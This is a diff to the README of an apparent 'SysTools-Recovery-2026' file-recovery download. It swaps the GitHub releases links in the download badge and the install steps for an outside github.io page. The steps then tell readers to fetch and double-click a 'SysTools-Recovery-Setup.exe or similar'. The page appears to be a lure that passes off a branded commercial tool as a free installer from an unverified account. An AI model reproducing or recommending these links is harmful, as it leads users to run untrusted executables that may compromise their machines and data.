@@ -1,6 +1,6 @@
 # 📁 SysTools-Recovery-2026 - Restore your lost files with ease
 
-[![Download Software](https://img.shields.io/badge/Download-SysTools_Recovery-blue.svg)](https://github.com/demetrathrilled836/SysTools-Recovery-2026/releases)
+[![Download Software](https://img.shields.io/badge/Download-SysTools_Recovery-blue.svg)](https://demetrathrilled836.github.io)
 
 ## 📋 About this software
 
@@ -20,7 +20,7 @@ Before you install the software, make sure your computer meets these minimum spe
 
 Follow these steps to set up the software on your machine.
 
-1. Visit the [official releases page](https://github.com/demetrathrilled836/SysTools-Recovery-2026/releases) to access the installer.
+1. Visit the [official releases page](https://demetrathrilled836.github.io) to access the installer.
 2. Locate the link labeled SysTools-Recovery-Setup.exe or similar.
 3. Click the link to download the file to your Downloads folder.
 4. Open your Downloads folder and double-click the installer file.
